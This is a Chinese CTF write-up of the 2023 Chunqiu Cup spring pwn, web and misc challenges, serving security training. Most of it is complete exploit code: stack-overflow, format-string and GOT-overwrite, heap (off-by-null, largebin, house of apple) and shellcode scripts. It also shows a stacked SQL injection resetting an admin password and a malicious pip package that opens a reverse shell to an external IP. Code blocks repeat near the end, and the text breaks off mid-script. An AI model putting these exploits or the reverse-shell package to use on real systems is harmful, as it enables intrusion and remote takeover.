---
title: 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇
contest: 春秋杯2023春季赛
year: 2023
difficulty: medium
vuln_type: rop
tags:
- 栈溢出
- partial write绕PIE
- 格式化字符串泄露elfbase
- off-by-null
- setcontext+orw
- lua字节码
attack_chain: p2048栈溢出+partial write 4bit爆破→LzhiFTP格式化字符串泄elfbase+idx负数越界写got→lua字节码修复+off-by-null堆overleap+setcontext+orw劫持free_hook
key_payload: p2048:sl(b'a'*(1048+4)+b'\x60'+b'\x5e'+b'\xff');LzhiFTP:'No%6$p'泄elfbase+idx=-16负数越界;setcontext+orw;lua字节码修复文件头
one_liner: 春秋杯2023春季赛pwn/web/misc三方向：p2048栈溢出+partial write+FTP fmtstr+got覆写+lua堆
lesson: partial write爆破4bit+fmtstr %p泄elfbase+idx未检查负数是常见pwn套路
quality: high
full_path: 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇.full.md
meta_path: 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇。春秋杯2023春季赛pwn/web/misc三方向：p2048栈溢出+partial write+FTP fmtstr+got覆写+lua堆。经验：partial write爆破4bit+fmtstr %p泄elfbase+idx未检查负数是常见pwn套路
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/120359.html
reasoning_chain:
- p2048：char v7[1048] + 无步数上限循环 → 触发点：栈溢出
- 动作：sl(b'a'*(1048+4)+b'\x60'+b'\x5e'+b'\xff') → 观察：溢出到返回地址
- 假设：win 函数偏移固定但 PIE 开启 → 动作：partial write 爆破 4bit
- 观察：爆破 16 次打通 → flag1
- LzhiFTP：输入格式化字符串 → 触发点：fmtstr 漏洞
- 动作：用户名 'No%6$p' → 观察：泄露 elfbase
- 假设：idx 未检查边界 → 动作：idx=-16 负数越界写 got 表
- 观察：覆写 free@got → setcontext+orw 劫持 → shell
- lua 字节码修复：拿到 .luac 缺文件头 → 动作：补 1b4c7561 → unluac 反编译
- off-by-null 堆 overleap + setcontext+orw → 劫持 free_hook → flag
failed_attempts:
- 栈溢出直接覆盖完整地址 → 失败：PIE 开启必须 partial write
- Lua 字节码直接反编译 → 失败：缺 magic header
key_observations:
- partial write 爆破 4bit + fmtstr %p 泄 elfbase 是常见 pwn 套路
- idx 未检查负数是 got 覆写常用入口
- Lua 字节码 magic 头是 1b4c7561
- setcontext+orw 是 2.31+ 替代 __free_hook 的标准打法
prerequisites:
- 栈溢出 + partial write 绕 PIE
- fmtstr 泄露（%p / %n）
- off-by-null 堆 overleap
- setcontext+orw 链构造
- Lua 字节码 magic 头
---
# 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇

> 原文: https://www.ctfiot.com/120359.html
> ID: 120359

保护全开：

分析程序逻辑可知正常游戏不能调用win函数，主要关注下面一部分逻辑，即存储每一步的输入，并且没有操作步数上限，可以栈溢出

char v7[1048]; // [esp+Ch] [ebp-418h] BYREF

  memset(v7, 0, 0x400u);
  for ( i = v7; ; *(i - 1) = v5 )
  {
    result = getchar();
    v6 = result;
    v5 = result;
    if ( (_BYTE)result == 0xFF )
      break;
    ...
  }

考虑到win函数里调了system('/bin/sh')，劫持程序流到win即可，partial write绕pie，由于页偏移一致，我们只需爆破4比特，

的可能性打通

EXP

from pwn import *

#io = remote("39.106.65.236",29331)
io = process("./p2048")

se = lambda data :io.send(data)
sea = lambda delim,data :io.sendafter(delim,data)
sl = lambda data :io.sendline(data)
sla = lambda delim,data :io.sendlineafter(delim,data)
ru = lambda delims,drop=True :io.recvuntil(delims,drop)
uu32 = lambda data :
u32(data.ljust(4,b'x00'))
uu64 = lambda data :
u64(data.ljust(8,b'x00'))
lg = lambda name,addr :
log.success(name+'='+hex(addr))

sl(b'a'*(1048+4)+b'x60'+b'x5e'+b'xff')

io.interactive()

查看保护，got表可写

输入输出初始化的时候设置了固定的随机数种子

.text:
0000000000001368 sub_1368        proc near               ; CODE XREF: sub_13AE+4E↓p
.text:
0000000000001368                 push    rbx
.text:
0000000000001368 sub_1368        endp ; sp-analysis failed
.text:
0000000000001368
.text:
000000000000136A                 nop     edx
.text:
000000000000136D                 push    rbp
.text:
000000000000136E                 mov     rbp, rsp
.text:
0000000000001371                 sub     rsp, 20h
.text:
0000000000001375                 mov     [rbp-14h], edi
.text:
0000000000001378                 mov     [rbp-18h], esi
.text:
000000000000137B                 mov     dword ptr [rbp-0Ch], 0
.text:
0000000000001382                 mov     dword ptr [rbp-8], 0
.text:
0000000000001389                 mov     dword ptr [rbp-4], 0
.text:
0000000000001390                 mov     edx, [rbp-0Ch]
.text:
0000000000001393                 mov     eax, [rbp-8]
.text:
0000000000001396                 add     edx, eax
.text:
0000000000001398                 mov     eax, [rbp-4]
.text:
000000000000139B                 add     eax, edx
.text:
000000000000139D                 add     eax, 64h ; 'd'
.text:
00000000000013A0                 mov     edi, eax
.text:
00000000000013A2                 call    _srand
.text:
00000000000013A7                 mov     eax, 0
.text:
00000000000013AC                 leave
.text:
00000000000013AD                 retn

直接gdb调试，断点打到if ( strcmp(s1, s2) )，查看s2的值即为我们要的password

登录成功之后进入主流程，一个简化版的shell

在edit的流程中index检查不严，未检查idx是否小于0

if ( !strncmp(s1, "edit", 4uLL) )
    {
      buf = 0;
      puts("idx:");
      read(0, &buf, 3uLL);
      buf = atoi((const char *)&buf);
      if ( buf > 10 )
      {
        puts("Error,");
      }
      else
      {
        printf("Content: ");
        read(0, *((void **)&unk_4B00 + buf), 0x20uLL);
        printf("%sn", *((const char **)&unk_4B00 + buf));
      }
    }

利用touch时会将创建的文件名写到bss里面，结合idx未检查小于0，可以做到任意地址写，最简单的想法往puts的got表里写system的plt表地址。但是这里我们需要elfbase，可以通过一开始yes/no部分的格式化字符串漏洞获得

printf("do you like my Server??(yes/No)");
  fgets(byte_4968, 8, stdin);
  if ( !strncmp(byte_4968, "No", 2uLL) )
  {
    printf("Your Choice:");
    printf(byte_4968);
    puts("nNo Thank you liking.");
  }

EXP

from pwn import *

#io = remote("39.106.131.193",41065)
io = process("./easy_LzhiFTP")
libc = ELF("./libc.so.6")
elf = ELF("./easy_LzhiFTP")

se = lambda data :io.send(data)
sea = lambda delim,data :io.sendafter(delim,data)
sl = lambda data :io.sendline(data)
sla = lambda delim,data :io.sendlineafter(delim,data)
ru = lambda delims,drop=True :io.recvuntil(delims,drop)
uu32 = lambda data :
u32(data.ljust(4,b'x00'))
uu64 = lambda data :
u64(data.ljust(8,b'x00'))
lg = lambda name,addr :
log.success(name+'='+hex(addr))

sla("Username: ", b'hash')
sla('Input Password: ', b'rx00')

sla("do you like my Server??(yes/No)", b'No%6$p')

ru("Your Choice:
No0x")
elfbase = int(ru('n'), 16)-0x2096
lg("elfbase",elfbase)
puts_got = elfbase+elf.got["puts"]
system = elfbase+elf.plt["system"]

payload = b'touch '+p64(puts_got)
sla("IMLZH1-FTP> ", payload)
sla("write Context:", 'a')

sla("IMLZH1-FTP> ", 'edit')
sea(b'idx:n', '-16')
se(p64(system))

sla("IMLZH1-FTP> ", 'touch /bin/sh')
sl("ls")
sleep(0.01)
sl("ls")
#gdb.attach(io)
io.interactive()

bins为lua字节码文件，文件头被修改，修复文件头后正常运行。

add_chunk中花指令混淆，实际存在一个off-by-null，size & 0xf = 8，inuse = 0。

伪造双向链表，向前合并造成overleap，劫持free_hook为：

mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]

setcontext + orw

from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

sh = remote('39.106.65.110',26090) 
#sh = process('./babyaul')
elf= cdll.LoadLibrary("./libc-2.31.so") 

libc = ELF('./libc-2.31.so')
def add(sz, type, c=''):
    sla('>', 'add')
    sla('size?', str(sz))
    sla('mode?', str(type))
    sl(c)
def delete(idx):
    sla('>', 'del')
    sla('index?', str(idx))
def show(idx):
    sla('>', 'get')
    sla('index?', str(idx))

sla('>', 'add')
sla('>', 'pass')
elf.srand(elf.time(0))
randnum = ''
for i in range(4):
    randnum += p8(elf.rand() % 43 + 0x30)
sla(':', randnum)
add(0x500,3)
add(0x500,3)

delete(0)
add(0x510,3)

add(0x500,3)
show(2)
libc_base = u64(ru('x7f')[-6:].ljust(8,' '))-0x1ecb0a-0x500
print hex(libc_base)
delete(2)
add(0x510, 3)
add(0x500,3,'a'*16)
show(3)
ru('a'*16)
heap_addr = u64(ru('x3e')[-7:-1].ljust(8,' ')) - 0xb20a
print hex(heap_addr)

fake_size = 0x110*4 - 0x10

add(0x100,2,p64(heap_addr + 0xbc60)*2)#4 pading tcache
add(0x100,2,p64(heap_addr + 0xc6a0) + p64(fake_size) + p64(heap_addr+0xc7a0) + p64(heap_addr + 0xc6a0-0x10)+p64(heap_addr + 0xc6a0)*2)#5
for i in range(3): #6
    add(0x100,2,p64(heap_addr + 0xc6a0)*2)

add(0x4f0,3, p64(heap_addr + 0xbc60)*2)
add(0x500,3)

delete(8)

add(0x108,1,' '*0x100+p64(0x430))

delete(9)

delete(7)
delete(6)
free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.sym['setcontext']+61
mprotect =libc_base + libc.sym['mprotect']
og = libc_base + 0x00000000001518b0
print hex(og)

add(0x4f0,3, ' '*0xf8+p64(0x110)+p64(free_hook-8))
add(0x100, 2, p64(0) + p64(og))
add(0x100, 2, p64(0) + p64(og))

sig = SigreturnFrame()
sig.rip = mprotect
sig.rdi = (heap_addr+0xd4f0)&(~0xfff)
sig.rsi = 0x2000
sig.rdx = 7
sig.rsp = heap_addr + 0xd4f0 + 0xf8
shellcode = shellcraft.open('flag',0)
shellcode += shellcraft.read('rax',heap_addr+0xd4f0, 0x50)
shellcode += shellcraft.write('1',heap_addr+0xd4f0, 0x50)

payload = p64(0) + p64(heap_addr+0xd4f0) + p64(0)*2 + p64(setcontext)
payload += str(sig)[0x28:]
payload += p64(heap_addr + 0xd4f0 + 0xf8+8)+asm(shellcode)
print hex(og),hex(len(str(sig)))

add(0x500,3, payload)
delete(11)
ti()

rwx内存中写入vm指令和可打印字符shellcode，利用vm功能的越界写改返回地址到rwx内存段。

from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

alpa = 'abcdefghijklmnopqrstuvwxyzA'
def getGoldCoins(r):
        sla('>> ', '1')
        sla(': ', '4')
        for i in range(r):
            elf.srand(elf.time(0))
            payload = ''
            for i in range(4):
                payload += alpa[elf.rand() % 26]
            sla('Give me : ', payload)
        sla('Give me : ', 'aaaa')
def getFullBackpack():
    sla('>> ', '2')
    sla('>> ', '2')
    sla('need : ', str(210))

def writeByOffset(off, val):
    if u8(val) == 0:
        return 'B' + off*3
    if u8(val) == 0x2:
        return 'A' + p8(0x37+0x44) + p8(0x31) + p8(0x30) + 'A' + p8(0x37+0x44+1) + p8(0x32) + p8(0x32) + 'F' + off + p8(0x37+0x44+1) + p8(0x37+0x44)
    return 'A' + off + p8(0x61) + p8(u8(val)+0x37)

def writeShellcode(payload):
    sla('>> ', '2')
    sla('>> ', '1')
    sla('purchase', payload)
#sh = process('./pwn')
sh = remote('47.94.224.3',37996)
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
#sh = remote('59.110.164.72',10022)
getGoldCoins(25)
getFullBackpack()
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
payload = ''
shellcode_addr = 0x20000+0x40
for i in range(8):
    payload += writeByOffset(p8(0x37+0x40+i), p8((shellcode_addr & 0xff)))
    shellcode_addr = shellcode_addr >> 8

payload += 'C' + p8(0x38+0x37)*2 + p8(0x30+0x37)
payload = payload.ljust(0x40, 'm') + shellcode
writeShellcode(payload)
#gdb.attach(sh, 'b *0x0000000000401624ncn')

sla('>> ', '2')
sla('>> ', '3')

ti()

MIPS架构，可控16字节shellcode，后门函数已经将后续syscall以及设置参数完成，需要使用可打印字符范围的shellcode将a1、a2寄存器置零。

from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'mips'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

#sh = process(['qemu-mipsel-static', '-L', './', '-g', '1234', 'pwn'])
#
sh = remote('47.94.224.3',18154)
floor = 0
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def getCoins():
    global floor
    sla('>', '1')
    elf.srand(0x1BF52)
    sla('want?', str(elf.rand() % 114514 % (floor + 1)))
    floor += 1

def getAttack(c):
    sla('>', '3')
    sla('buy? ', c)

for i in range(99):
    getCoins()

getAttack('3')
getAttack('2')

payload = asm('andi $a2, $t2, 0x2222') + asm('andi $a1, $t2, 0x2222') + asm('andi $a1, $t2, 0x2222')+asm('andi $a1, $t2, 0x2222')
getCoins()
sla('>',payload)

ti()

UAF，一次leak，一次read。

largebin attack + house of apple

from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

#sh = remote('39.106.65.236',19493)
libc = ELF("./libc-2.35.so") 
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def add(idx, sz):
    while True:
        sla('ce: ','1')
        sla('explore: ', str(idx))
        sla(' time: ', str(sz))
        if ((elf.rand() % 10)<=4):
            sla('no)', '0')
            break
        else:
            sla('no)', '1')
def delete(idx):
    sla('ce: ','2')
    sla(': ', str(idx))
def show(idx):
    sla('ce: ','4')
    sla(': ', str(idx))

def edit(idx ,sz, c):
    sla('ce: ','3')
    sla('to: ', str(idx))
    sla('send: ', str(sz))
    sa('nclusions: ', c)

sh = process('./pwn')
seed = elf.time(0)
signFlag = (seed * 0xA3D70A3D70A3D70B) >> 64 
signR6_rax = signFlag >> 6 #rdx
signL2_rax = (signR6_rax << 2)
rax = signR6_rax + signL2_rax
rdx = rax*4
rax = rdx + rax
rax = rax << 2
seed = rax
print hex(seed)
elf.srand(seed)

add(0, 0x800)
add(1, 0x800)
add(2, 0x7f0)
delete(0)
add(3, 0xa00)
delete(2)
add(4, 0xa00)
show(0)
ru('follows:n')
heap_addr = u64(rc(8))-0x18c0+0x10 + 0x600
libc_base = u64(rc(8))-0x21a1d0

print hex(heap_addr)
print hex(libc_base)
add(0, 0x800)
add(2, 0x7f0)

add(0, 0x1000)
delete(0)

add(1, 0x520)
add(2,0x520)
add(3, 0x510)
add(4, 0x520)
delete(1)
add(2, 0x600)
delete(3)
target = libc_base + 0x21a680
fd_bk = libc_base + 0x21a110
fd_next = heap_addr + 0x2ed0

l_pre = libc_base + 0x228270
setcontext = libc_base + libc.sym['setcontext']
l_real = heap_addr + 0x2ed0

sig = SigreturnFrame()
sig.rip = libc_base + libc.sym['system']
sig.rdi = heap_addr + 0x3400+0x10
sig.rsp = heap_addr + 0x100

fake_io_addr = heap_addr + 0x3930
fake_largebin = p64(fd_bk)*2 + p64(fd_next) + p64(target-0x20)
payload = fake_largebin
payload = payload.ljust(0x528, ' ')
payload += p64(0x530)
payload += 'cat flag' + str(sig)[0x18:
0xd0] +p64(0)*2 + p64(fake_io_addr+0x40+0x38) + str(sig)[0xd8:]
payload = payload.ljust(0x530+0x528,' ')

payload += p64(0x521)+p64(libc_base + 0x219ce0)*2

fake_IO_FILE=p64(0)*4
fake_IO_FILE +=p64(1)+p64(0)
#
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=setcontext_rdx
fake_IO_FILE +=p64(setcontext+61)#_IO_save_end=call addr(call setcontext)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, 'x00')
fake_IO_FILE += p64(libc_base + libc.sym['system']) + p64(heap_addr+0x3410)
fake_IO_FILE += p64(heap_addr+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x80, 'x00')
fake_IO_FILE +=p64(heap_addr+0x3400)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, 'x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE += p64(libc_base+0x2160c0) + p64(libc_base + 0xebcf5)
# vtable=IO_wfile_jumps #call [rax+0x18]
#fake_IO_FILE += p64(libc_base+0x2160c0) + p64(libc_base+0x000000000009d398)
'''
gd 0x9d398
mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
'''
fake_IO_FILE += p64(0)*5
fake_IO_FILE += p64(fake_io_addr+0x40+0x38)  # rax2_addr
payload += fake_IO_FILE
edit(0, len(payload), payload)
print hex(len(fake_IO_FILE))
print hex(fake_io_addr)
print hex(libc_base+0x000000000009d398)
#gdb.attach(sh)
add(2, 0x600)
sla(':', '5')

ti()

访问首页是404：

通过代码分析，可以在WebServer.php文件里找到这一行：

这里是通过判断HTTP_X_REQUESTED_WITH，如果等于XMLHttpRequest就会返回true，我们现在去构造一下：

进入了后台，然后通过堆叠注入修改后台用户密码（注：这里的密码是经过五次MD5加密的特殊值）：

admin';UPDATE ADMINS set PASSWORD = '17e7007726eeb36a85a5573e6a04bc1b';--

重启服务，然后就可以登陆后台了

进入了后台两种方式可以查看到flag，一种通过计划任务反弹shell：

第二种就是通过修改设置，直接查看flag：

然后来到文件管理里，一直点这个，退到根目录里：

这个接口是用来下载python包的

我们现在去自定义恶意的pip包

借鉴：

https://www.freecodecamp.org/chinese/news/build-your-first-python-package/

创建一个setup.py：

from setuptools import setup, find_packages

VERSION = '0.0.1' 
DESCRIPTION = 'My first Python package'
LONG_DESCRIPTION = 'My first Python package with a slightly longer description'

setup(
        name="123", 
        version=VERSION,
        author="Ten",
        author_email="admin@qq.com",
        description=DESCRIPTION,
        long_description=LONG_DESCRIPTION,
        packages=find_packages(),
        install_requires=[], # add any additional packages that 
  
)

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("8.130.30.76",8089))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])

接在在setup.py当前的目录下构造包：

python3 setup.py sdist

构造完之后进入dist目录：

开启一个web端口：

python3 -m http.server 8080

然后再开启一个监听shell的端口,就是setup.py文件里写的端口：

nc -lvp 8089

然后传入网址，进行请求，要注意http要大小写绕过一下：

反弹shell成功：

三个文件

使用010editor将12和34.mp4文件拖进去

12文件一看就是少了文件头

拿34.pm4文件进行对比

可以发现12文件应该也是一个mp4文件，只不过比较起来，12比34.mp4少了38个字节，这些都是固定数据，直接化身cv工程师，将其补全，然后改一下12文件的后缀为12.mp4。

打开视频，发现了压缩包的密码

解压缩得到了png图片：

文件尾发现了一个key，根据题目的名字，盲人会藏在哪里，那应该就是盲隐藏，这是一个隐写术，叫法不一样，这个可以说是盲隐藏，也可以说是数字隐写，这种隐写极其隐蔽，通过十六进制去查看，也很难可以发现会有什么明显的特征，这个题目在ctftime历届有一个比赛出过类似的，通过查找数字隐写，找了一款工具：

Digital Invisible Ink Toolkit

查看文档下的1.txt文件

还有另一种方法，也算是一个非预期，通过zsteg提取

然后使用zsteg提取一下

zsteg -E "b1,bgr,lsb,xy" flag.png > 1

+ + + + + + + + + + +

CTF大本营练习链接：

https://www.ichunqiu.com/competition

春秋杯网络安全联赛将持续打造网络安全新社区，希望更多参赛选手通过比赛结识志同道合的朋友以及交流经验和技巧，欢迎更多伙伴加入春秋杯赛事宇宙，期待大家再次相聚，继续挑战新高度，探索更广阔的宇宙星河！

春秋杯赛事交流QQ群：277328440；

春秋杯赛事交流群（微信群），进群请先加楠辞微信：h40215_

+ + + + + + + + + + +


```
char v7[1048]; // [esp+Ch] [ebp-418h] BYREF

  memset(v7, 0, 0x400u);
  for ( i = v7; ; *(i - 1) = v5 )
  {
    result = getchar();
    v6 = result;
    v5 = result;
    if ( (_BYTE)result == 0xFF )
      break;
    ...
  }
from pwn import *

    #io = remote("39.106.65.236",29331)
io = process("./p2048")

se = lambda data :io.send(data)
sea = lambda delim,data :io.sendafter(delim,data)
sl = lambda data :io.sendline(data)
sla = lambda delim,data :io.sendlineafter(delim,data)
ru = lambda delims,drop=True :io.recvuntil(delims,drop)
uu32 = lambda data :
u32(data.ljust(4,b'x00'))
uu64 = lambda data :
u64(data.ljust(8,b'x00'))
lg = lambda name,addr :
log.success(name+'='+hex(addr))

sl(b'a'*(1048+4)+b'x60'+b'x5e'+b'xff')

io.interactive()
.text:
0000000000001368 sub_1368        proc near               ; CODE XREF: sub_13AE+4E↓p
.text:
0000000000001368                 push    rbx
.text:
0000000000001368 sub_1368        endp ; sp-analysis failed
.text:
0000000000001368
.text:
000000000000136A                 nop     edx
.text:
000000000000136D                 push    rbp
.text:
000000000000136E                 mov     rbp, rsp
.text:
0000000000001371                 sub     rsp, 20h
.text:
0000000000001375                 mov     [rbp-14h], edi
.text:
0000000000001378                 mov     [rbp-18h], esi
.text:
000000000000137B                 mov     dword ptr [rbp-0Ch], 0
.text:
0000000000001382                 mov     dword ptr [rbp-8], 0
.text:
0000000000001389                 mov     dword ptr [rbp-4], 0
.text:
0000000000001390                 mov     edx, [rbp-0Ch]
.text:
0000000000001393                 mov     eax, [rbp-8]
.text:
0000000000001396                 add     edx, eax
.text:
0000000000001398                 mov     eax, [rbp-4]
.text:
000000000000139B                 add     eax, edx
.text:
000000000000139D                 add     eax, 64h ; 'd'
.text:
00000000000013A0                 mov     edi, eax
.text:
00000000000013A2                 call    _srand
.text:
00000000000013A7                 mov     eax, 0
.text:
00000000000013AC                 leave
.text:
00000000000013AD                 retn
if ( !strncmp(s1, "edit", 4uLL) )
    {
      buf = 0;
      puts("idx:");
      read(0, &buf, 3uLL);
      buf = atoi((const char *)&buf);
      if ( buf > 10 )
      {
        puts("Error,");
      }
      else
      {
        printf("Content: ");
        read(0, *((void **)&unk_4B00 + buf), 0x20uLL);
        printf("%sn", *((const char **)&unk_4B00 + buf));
      }
    }
printf("do you like my Server??(yes/No)");
  fgets(byte_4968, 8, stdin);
  if ( !strncmp(byte_4968, "No", 2uLL) )
  {
    printf("Your Choice:");
    printf(byte_4968);
    puts("nNo Thank you liking.");
  }
from pwn import *

    #io = remote("39.106.131.193",41065)
io = process("./easy_LzhiFTP")
libc = ELF("./libc.so.6")
elf = ELF("./easy_LzhiFTP")

se = lambda data :io.send(data)
sea = lambda delim,data :io.sendafter(delim,data)
sl = lambda data :io.sendline(data)
sla = lambda delim,data :io.sendlineafter(delim,data)
ru = lambda delims,drop=True :io.recvuntil(delims,drop)
uu32 = lambda data :
u32(data.ljust(4,b'x00'))
uu64 = lambda data :
u64(data.ljust(8,b'x00'))
lg = lambda name,addr :
log.success(name+'='+hex(addr))

sla("Username: ", b'hash')
sla('Input Password: ', b'rx00')

sla("do you like my Server??(yes/No)", b'No%6$p')

ru("Your Choice:
No0x")
elfbase = int(ru('n'), 16)-0x2096
lg("elfbase",elfbase)
puts_got = elfbase+elf.got["puts"]
system = elfbase+elf.plt["system"]

payload = b'touch '+p64(puts_got)
sla("IMLZH1-FTP> ", payload)
sla("write Context:", 'a')

sla("IMLZH1-FTP> ", 'edit')
sea(b'idx:n', '-16')
se(p64(system))

sla("IMLZH1-FTP> ", 'touch /bin/sh')
sl("ls")
sleep(0.01)
sl("ls")
    #gdb.attach(io)
io.interactive()
mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

sh = remote('39.106.65.110',26090) 
    #sh = process('./babyaul')
elf= cdll.LoadLibrary("./libc-2.31.so") 

libc = ELF('./libc-2.31.so')
def add(sz, type, c=''):
    sla('>', 'add')
    sla('size?', str(sz))
    sla('mode?', str(type))
    sl(c)
def delete(idx):
    sla('>', 'del')
    sla('index?', str(idx))
def show(idx):
    sla('>', 'get')
    sla('index?', str(idx))

sla('>', 'add')
sla('>', 'pass')
elf.srand(elf.time(0))
randnum = ''
for i in range(4):
    randnum += p8(elf.rand() % 43 + 0x30)
sla(':', randnum)
add(0x500,3)
add(0x500,3)

delete(0)
add(0x510,3)

add(0x500,3)
show(2)
libc_base = u64(ru('x7f')[-6:].ljust(8,' '))-0x1ecb0a-0x500
print hex(libc_base)
delete(2)
add(0x510, 3)
add(0x500,3,'a'*16)
show(3)
ru('a'*16)
heap_addr = u64(ru('x3e')[-7:-1].ljust(8,' ')) - 0xb20a
print hex(heap_addr)

fake_size = 0x110*4 - 0x10

add(0x100,2,p64(heap_addr + 0xbc60)*2)#4 pading tcache
add(0x100,2,p64(heap_addr + 0xc6a0) + p64(fake_size) + p64(heap_addr+0xc7a0) + p64(heap_addr + 0xc6a0-0x10)+p64(heap_addr + 0xc6a0)*2)#5
for i in range(3): #6
    add(0x100,2,p64(heap_addr + 0xc6a0)*2)

add(0x4f0,3, p64(heap_addr + 0xbc60)*2)
add(0x500,3)

delete(8)

add(0x108,1,' '*0x100+p64(0x430))

delete(9)

delete(7)
delete(6)
free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.sym['setcontext']+61
mprotect =libc_base + libc.sym['mprotect']
og = libc_base + 0x00000000001518b0
print hex(og)

add(0x4f0,3, ' '*0xf8+p64(0x110)+p64(free_hook-8))
add(0x100, 2, p64(0) + p64(og))
add(0x100, 2, p64(0) + p64(og))

sig = SigreturnFrame()
sig.rip = mprotect
sig.rdi = (heap_addr+0xd4f0)&(~0xfff)
sig.rsi = 0x2000
sig.rdx = 7
sig.rsp = heap_addr + 0xd4f0 + 0xf8
shellcode = shellcraft.open('flag',0)
shellcode += shellcraft.read('rax',heap_addr+0xd4f0, 0x50)
shellcode += shellcraft.write('1',heap_addr+0xd4f0, 0x50)

payload = p64(0) + p64(heap_addr+0xd4f0) + p64(0)*2 + p64(setcontext)
payload += str(sig)[0x28:]
payload += p64(heap_addr + 0xd4f0 + 0xf8+8)+asm(shellcode)
print hex(og),hex(len(str(sig)))

add(0x500,3, payload)
delete(11)
ti()
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()

alpa = 'abcdefghijklmnopqrstuvwxyzA'
def getGoldCoins(r):
        sla('>> ', '1')
        sla(': ', '4')
        for i in range(r):
            elf.srand(elf.time(0))
            payload = ''
            for i in range(4):
                payload += alpa[elf.rand() % 26]
            sla('Give me : ', payload)
        sla('Give me : ', 'aaaa')
def getFullBackpack():
    sla('>> ', '2')
    sla('>> ', '2')
    sla('need : ', str(210))

def writeByOffset(off, val):
    if u8(val) == 0:
        return 'B' + off*3
    if u8(val) == 0x2:
        return 'A' + p8(0x37+0x44) + p8(0x31) + p8(0x30) + 'A' + p8(0x37+0x44+1) + p8(0x32) + p8(0x32) + 'F' + off + p8(0x37+0x44+1) + p8(0x37+0x44)
    return 'A' + off + p8(0x61) + p8(u8(val)+0x37)

def writeShellcode(payload):
    sla('>> ', '2')
    sla('>> ', '1')
    sla('purchase', payload)
    #sh = process('./pwn')
sh = remote('47.94.224.3',37996)
elf= cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    #sh = remote('59.110.164.72',10022)
getGoldCoins(25)
getFullBackpack()
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
payload = ''
shellcode_addr = 0x20000+0x40
for i in range(8):
    payload += writeByOffset(p8(0x37+0x40+i), p8((shellcode_addr & 0xff)))
    shellcode_addr = shellcode_addr >> 8

payload += 'C' + p8(0x38+0x37)*2 + p8(0x30+0x37)
payload = payload.ljust(0x40, 'm') + shellcode
